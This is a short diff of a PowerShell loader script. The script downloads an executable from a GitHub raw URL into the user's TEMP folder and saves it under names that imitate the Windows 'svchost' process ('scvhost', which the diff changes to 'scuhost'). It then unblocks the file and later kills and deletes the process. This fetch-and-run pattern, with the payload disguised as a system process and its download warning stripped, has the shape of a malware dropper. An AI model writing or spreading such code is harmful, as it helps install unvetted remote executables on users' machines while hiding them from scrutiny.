@@ -125,8 +125,8 @@ while ($true)
 
         Write-Console "DOWNLOADING..." "INFO"
 
-$url  = "https://raw.githubusercontent.com/draft7973-ops/JETT.EXE/refs/heads/main/svchost.exe"
-$path = "$env:TEMP\scvhost.exe"
+$url  = "https://raw.githubusercontent.com/draft7973-ops/JETT.EXE/refs/heads/main/scvhost.exe"
+$path = "$env:TEMP\scuhost.exe"
 
 try {
 
@@ -142,6 +142,7 @@ try {
     if (Test-Path $path)
     {
         Write-Host ""
+
         Write-Console "INSTALL SUCCESS" "SUCCESS"
 
         Unblock-File $path -ErrorAction SilentlyContinue
@@ -151,8 +152,17 @@ try {
     else
     {
         Write-Host ""
+
         Write-Console "INSTALL FAILED" "NO KEY"
     }
+}
+catch {
+
+    Write-Host ""
+    Write-Host $_.Exception.Message -ForegroundColor Red
+
+    Write-Console "INSTALL FAILED" "NO KEY"
+}
 }
 catch {
 
@@ -177,12 +187,12 @@ catch {
         Write-Console "CLEANING..." "INFO"
 
         Stop-Process `
-        -Name "scvhost" `
+        -Name "scuhost" `
         -Force `
         -ErrorAction SilentlyContinue
 
         Remove-Item `
-        "$env:TEMP\scvhost.exe" `
+        "$env:TEMP\scuhost.exe" `
         -Force `
         -ErrorAction SilentlyContinue
 
